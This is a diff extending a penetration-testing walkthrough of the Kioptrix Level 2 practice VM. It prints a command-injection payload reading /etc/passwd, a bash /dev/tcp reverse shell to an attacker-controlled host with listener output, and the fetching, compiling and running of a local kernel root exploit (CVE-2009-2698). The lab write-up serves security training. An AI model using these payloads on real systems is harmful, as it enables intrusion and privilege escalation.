@@ -118,7 +118,8 @@ and yes we land to a page that has an input field to specify an IP address... so
 
 and the result is:
 
-``` 127.0.0.1; cat /etc/passwd
+```bash
+127.0.0.1; cat /etc/passwd
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.041 ms
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
@@ -145,10 +146,130 @@ Let's open a reverse shell and get a better look inside the guest :-)
 
 On the Kali host we run a netcat listener on port 4444:
 
-``` netcat -lvp 4444 ```
+```netcat -lvp 4444```
 
 and on the webside we run the command:
 
 ```127.0.0.1;/bin/bash -i >& /dev/tcp/192.168.1.26/4444 0>&1```
 
-and we are inside the box.
+and we are inside the box:
+
+```bash
+listening on [any] 4444 ...
+192.168.1.32: inverse host lookup failed: Unknown host
+connect to [192.168.1.26] from (UNKNOWN) [192.168.1.32] 32769
+bash: no job control in this shell
+bash-3.00$ ls -ltr
+total 8
+-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
+bash-3.00$ pwd
+/var/www/html
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ hostname
+kioptrix.level2
+bash-3.00$ 
+```
+We note that the 2 php files have the setgid active.
+This means that any file dropped into the www folder will take on the folder's owning group which is root(1):
+
+```bash
+total 48
+drwxr-xr-x   2 root      root 4096 May  4  2007 cgi-bin
+drwxr-xr-x   3 root      root 4096 Oct  7  2009 error
+drwxr-xr-x  13 root      root 4096 Oct  7  2009 manual
+drwxr-xr-x   3 root      root 4096 Oct  8  2009 icons
+drwxr-xr-x   2 root      root 4096 Oct  8  2009 html
+drwxr-xr-x   2 webalizer root 4096 Mar 11 23:06 usage
+bash-3.00$ pwd
+/var/www
+```
+Why is the letter S uppercase?
+
+* 'S' = The directory's setgid bit is set, but the execute bit isn't set.
+
+* 's' = The directory's setgid bit is set, and the execute bit is set.
+
+The php files have the t attribute at the end. This is the sticky bit and it gets ignored by moder linux O.S.
+
+So I think we cannot do much here and we should go ahead looking for privilege escalation using some vulnerability available in the searchsploit...
+
+# Privilege escalation
+
+I know I pointed out the openSSH being old but so the OS is:
+
+```
+bash-3.00$ cat /etc/redhat-release
+CentOS release 4.5 (Final)
+```
+I try to look in searchsploit for anything about CentOS 4.5:
+
+```searchsploit centos 4.5```
+
+and I get:
+
+```bash
+tamosma@kali:~/hck-exercise/kioptrix_1.2$  searchsploit centos 4.5
+------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                   |  Path
+                                                                                                 | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_da | exploits/linux_x86/local/9542.c
+Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                    | exploits/linux/local/35370.c
+------------------------------------------------------------------------------------------------- ----------------------------------------
+```
+I have a look at what is inside the 9542.c exploit:
+
+```console
+** 0x82-CVE-2009-2698
+** Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit
+```
+This is an exploit to gain root access but it is local, that means we have to copy over the target host. Usually you have to compile it locally to have it working so let's see if gcc is installed on the victim host:
+
+```
+bash-3.00$ gcc -v
+gcc -v
+Reading specs from /usr/lib/gcc/i386-redhat-linux/3.4.6/specs
+Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --enable-shared --enable-threads=posix --disable-checking --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-java-awt=gtk --host=i386-redhat-linux
+Thread model: posix
+gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)
+```
+
+Yes it is... so let's transfer the file over from kali to the victiom host. TO do that I use the Python built in http server as it is of immediate use. On Kali:
+
+```1351  sudo python -m SimpleHTTPServer 8001```
+
+and on the victim:
+
+```bash
+bash-3.00$ cd /tmp
+bash-3.00$ wget -v 192.168.1.26:8001/9542.c
+--15:57:12--  http://192.168.1.26:8001/9542.c
+           => `9542.c'
+Connecting to 192.168.1.26:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,643 (2.6K) [text/plain]
+
+    0K ..                                                    100%   86.92 MB/s
+
+15:57:12 (86.92 MB/s) - `9542.c' saved [2643/2643]
+```
+Inside the 9542.c file we find the instructions to compile and execute the exploit in one go:
+
+```cc -o 9542 9542.c && ./9542```
+
+and here we are:
+```
+bash-3.00$ gcc -o 9542 9542.c && ./9542
+9542.c:109:28: warning: no newline at end of file
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+```
+
+
+
+References:
+1. http://www.gnu.org/software/coreutils/manual/html_node/Directory-Setuid-and-Setgid.html
+2. 
